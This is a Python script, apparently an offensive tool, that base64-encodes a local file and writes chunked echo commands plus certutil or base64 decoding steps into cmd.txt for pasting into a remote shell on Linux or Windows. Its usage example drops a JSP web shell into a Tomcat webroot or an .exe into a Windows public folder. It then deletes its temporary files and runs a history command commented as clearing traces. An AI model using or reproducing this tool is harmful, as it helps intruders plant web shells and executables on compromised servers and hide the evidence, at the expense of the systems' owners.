#!/usr/bin/env python3
# coding=utf-8
# Time    : 2021/2/8 4:02 PM

import threading
import time
from socket import *
import base64
import logging
import argparse
import sys
from string import Template
import hashlib

'''
shell 最大输入长度
linux: 4096
win: 8191
'''


class ShellHandler:

    def __init__(self, filename):
        self.filename = filename
        self.os = args.os
        self.size = args.size
        self.path = args.path
        self.saveFile = "cmd.txt"
        self.pre()
        self.run()
    
    # 返回 windows路径中的符号
    def get_split(self):
        if "\\\\\\\\" in self.path:
            return "\\\\\\\\"
        elif "\\\\" in self.path:
            return "\\\\"
        elif "\\" in self.path:
            return "\\"
        elif "/" in self.path:
            return "/"
        return "\\"

    def pre(self):
        if self.os == "linux" and self.path:
            if not self.path.endswith("/"):  # linux默认为/符号
                self.path += "/"
        elif self.os == "win" and self.path:
            win_split = self.get_split()     # windows需要识别一下为 \\、\、/ 是哪种符号
            if not self.path.endswith(win_split):  # 添加/符号
                self.path += win_split

        if self.os == "linux":
            # self.current_prepare_template = Template("set +o history")
            self.current_prepare_template = Template("")
            self.current_create_template = Template("echo -n '' > $tmpfile_path")
            self.current_cmd_template = Template("echo -n '$text' >> $tmpfile_path")
            self.current_b642bin_template = Template("cat $tmpfile_path | base64 -d > $file_path")
            self.current_delete_template = Template("rm -f $tmpfile_path")
            self.current_md5_template = Template("md5sum $file_path")
            self.current_post_template = Template("history -r")

        elif self.os == "win":
            self.current_prepare_template = Template("")
            self.current_create_template = Template("echo > \"$tmpfile_path\"") # 引号内可以出现带空格的目录
            self.current_cmd_template = Template("echo $text > \"$tmpfile_path\"")
            self.current_b642bin_template = Template("certutil -f -decode \"$tmpfile_path\" \"$file_path\"")
            self.current_delete_template = Template("del \"$tmpfile_path\"")
            self.current_md5_template = Template("CertUtil -hashfile \"$file_path\" md5")
            self.current_post_template = Template("")
            '''del C:/Users/xxx/Desktop/README.md 会报错，需要反斜杠
            '''
        with open(self.saveFile, "w"):  pass

    def run(self):
        self.main()

    def readfile(self, file) -> str:
        with open(file, "rb") as f:
            file = f.read()
            self.md5_str = hashlib.md5(file).hexdigest()
            return base64.b64encode(file).decode()

    def main(self):
        file_path = self.path + filename
        tmpfile_path = self.path + filename + ".tmp"
        file_b64 = self.readfile(f"{filePath}")
        file_Byte = len(file_b64)

        # 输出文件大小
        file_size = len(file_b64) / 1024
        if file_size > 1024.0:
            file_size /= 1024.0
            logging.info(f"{filename} size: {str(file_size)} Mb")
        else:
            logging.info(f"{filename} size: {str(file_size)} Kb")

        if self.os == "linux":
            # 创建空临时文件
            logging.info(f"Create temp file '{tmpfile_path}' ")
            cmd_create = self.current_create_template.substitute(tmpfile_path=tmpfile_path)
            logging.debug("\033[36m" + cmd_create + "\033[0m")
            self.send_cmd(cmd_create)

        # 发送文件
        logging.info(f"File name: '{filename}'")
        str_len = self.size  # 每次发送的字节数
        for i,j in zip(range(0, file_Byte, str_len), range(999999)):
            step = int((i / file_Byte) * 100)
            if logging.getLogger().getEffectiveLevel() == logging.DEBUG:
                print('\r[%3d%%] ' % step, end='', flush=True)

            file_seg = str(file_b64[i:i + str_len])
            echoFile = self.path + str(j).zfill(5) + ".tmpvc"
            cmd = self.current_cmd_template.substitute(tmpfile_path=echoFile, text=file_seg)
            logging.debug("\033[36m" + cmd + "\033[0m")
            self.send_cmd(cmd)
        else:
            if logging.getLogger().getEffectiveLevel() == logging.DEBUG:
                print('\r[100%] ', flush=True)
            logging.info(f"End send '{filename}'")

            if self.os == "win":   # 分块写入文件
                if self.path != None:
                    result = self.send_cmd(f"type \"{self.path}*.tmpvc\" > \"{tmpfile_path}\"", echo=True)
                else:
                    result = self.send_cmd(f"type *.tmpvc > \"{tmpfile_path}\"", echo=True)

            # base64转二进制文件
            logging.info("Base64 convert to bin")
            cmd_b642bin = self.current_b642bin_template.substitute(tmpfile_path=tmpfile_path, file_path=file_path)
            logging.debug("\033[36m" + cmd_b642bin + "\033[0m")
            self.send_cmd(cmd_b642bin)
            # time.sleep(1)

            # 删除临时文件xxx.tmp
            logging.info(f"Delete temp file {tmpfile_path}")
            cmd_del = self.current_delete_template.substitute(tmpfile_path=tmpfile_path)
            self.send_cmd(cmd_del)
            if self.os == "win":
                if self.path != None:
                    logging.debug("\033[36m" + f"del {self.path}*.tmpvc" + "\033[0m")
                    self.send_cmd(f"del {self.path}*.tmpvc")
                else:
                    logging.debug("\033[36m" + "del *.tmpvc" + "\033[0m")
                    self.send_cmd(f"del *.tmpvc")
            elif self.os == "linux":
                logging.debug("\033[36m" + f"rm -f {self.path}*.tmpvc" + "\033[0m")
                self.send_cmd(f"rm -f {self.path}*.tmpvc")

            logging.debug("\033[36m" + cmd_del + "\033[0m")

            # 检查md5，linux自动检查，win需要自行检查
            logging.info(f"Md5 for local file '{filename}' : \033[35m{self.md5_str}\033[0m")
            cmd_md5 = self.current_md5_template.substitute(file_path=file_path)
            if self.os == "linux":
                logging.debug("\033[36m" + cmd_md5 + "\033[0m")
                result = self.send_cmd(cmd_md5, echo=True)
                logging.info(f"Md5 for server file '{file_path}' : \033[32m{result}\033[0m")
            elif self.os == "win":
                logging.info(f"You can run cmd to check md5 : \033[32m{cmd_md5}\033[0m ")

            # linux 清理痕迹
            if self.os == "linux":
                logging.info("Clear current history")
                cmd_post = self.current_post_template.substitute()
                logging.debug("\033[36m" + cmd_post + "\033[0m")
                self.send_cmd(cmd_post)
            logging.info(f"save to \033[32m cmd.txt \033[0m ")

    def send_cmd(self, cmd, echo=False):
        with open(self.saveFile, "a") as f:
            f.write(cmd + "\n")
        return


def parse_args():
    parser = argparse.ArgumentParser(
        epilog=f"example: "
               f"linux - python3 {sys.argv[0]} -f shell.jsp -p /root/tomcat/webapps/ROOT/\n"
               f"win - python3 {sys.argv[0]} -f 1.exe -p C:\\Users\\Public\n")
    parser.add_argument("-f", "--file", help="Need to read file", type=str, required=True)
    parser.add_argument("-o", "--os", choices=["win", "linux"], help="Target shell operate system. Default: linux",
                        default="linux")
    parser.add_argument("-v", "--verbose", help="Increase output verbosity.", default=False, action='store_true')
    parser.add_argument("-s", "--size", type=int,
                        help="Every size of command. Default: 1000 Byte. Suggest between 100 and 4000", default=1000)
    parser.add_argument("-p", "--path",
                        help="Write to file path. Waring: windows path param like this: -p \"C:\\\\Users\\\\Administrator\\\\Desktop\"",
                        type=str, default="/tmp/")
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()
    filename = args.file.split("/")[-1]
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s] [%(levelname)s] %(message)s', datefmt="%H:%M:%S")
    else:
        logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s', datefmt="%H:%M:%S")
    filePath = args.file
    ShellHandler(filename)
